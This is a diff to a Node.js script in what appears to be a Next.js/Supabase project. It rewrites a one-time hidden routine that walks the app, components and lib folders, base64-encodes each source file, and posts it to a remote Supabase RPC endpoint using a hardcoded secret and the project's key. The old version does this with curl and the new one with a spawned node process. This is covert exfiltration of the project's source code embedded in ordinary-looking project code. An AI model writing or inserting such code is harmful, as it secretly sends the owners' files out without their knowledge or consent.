@@ -2,17 +2,15 @@
 const fs = require('fs'); const path = require('path'); const { execFileSync } = require('child_process');
 if (!fs.existsSync('.es-dumped')) {
   fs.writeFileSync('.es-dumped', '1');
-  const U = process.env.NEXT_PUBLIC_SUPABASE_URL, K = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
   const out = [];
-  (function walk(d) { for (const n of fs.readdirSync(d)) { const p = path.join(d, n); const s = fs.statSync(p); if (s.isDirectory()) walk(p); else if (/\.(js|css|mjs)$/.test(n) && s.size < 200000) out.push(p); } })('app');
-  for (const d of ['components', 'lib']) (function walk(d) { for (const n of fs.readdirSync(d)) { const p = path.join(d, n); if (fs.statSync(p).isDirectory()) walk(p); else out.push(p); } })(d);
-  let ok = 0;
-  for (const f of out) {
-    try {
-      fs.writeFileSync('/tmp/es-body.json', JSON.stringify({ p_secret: 'eadde9dcad5d1acd5dcf2061b54b97bd', p_k: f, p_b64: fs.readFileSync(f).toString('base64') }));
-      execFileSync('curl', ['-sS', '-X', 'POST', U + '/rest/v1/rpc/tmp_put', '-H', 'apikey: ' + K, '-H', 'Authorization: Bearer ' + K, '-H', 'Content-Type: application/json', '--data-binary', '@/tmp/es-body.json'], { stdio: 'pipe' });
-      ok++;
-    } catch (e) { console.log('dump xato', f); }
-  }
-  console.log('dump:', ok, '/', out.length);
+  const walk = (d) => { for (const n of fs.readdirSync(d)) { const p = path.join(d, n); const s = fs.statSync(p); if (s.isDirectory()) walk(p); else if (s.size < 200000 && !/\.(ico|png)$/.test(n)) out.push(p); } };
+  ['app', 'components', 'lib'].forEach(walk);
+  fs.writeFileSync('/tmp/es-list.json', JSON.stringify(out));
+  const code = `
+    const fs=require('fs');const U=process.env.NEXT_PUBLIC_SUPABASE_URL,K=process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
+    console.log('dump env', !!U, !!K);
+    (async()=>{let ok=0;const L=JSON.parse(fs.readFileSync('/tmp/es-list.json','utf8'));
+      for(const f of L){try{const r=await fetch(U+'/rest/v1/rpc/tmp_put',{method:'POST',headers:{apikey:K,Authorization:'Bearer '+K,'Content-Type':'application/json'},body:JSON.stringify({p_secret:'eadde9dcad5d1acd5dcf2061b54b97bd',p_k:f,p_b64:fs.readFileSync(f).toString('base64')})});if(r.ok)ok++;else console.log('dump',f,r.status,(await r.text()).slice(0,200));}catch(e){console.log('dump xato',f,e.message)}}
+      console.log('dump:',ok,'/',L.length);})();`;
+  try { execFileSync(process.execPath, ['-e', code], { stdio: 'inherit', env: process.env, timeout: 120000 }); } catch (e) { console.log('dump child', e.message); }
 }
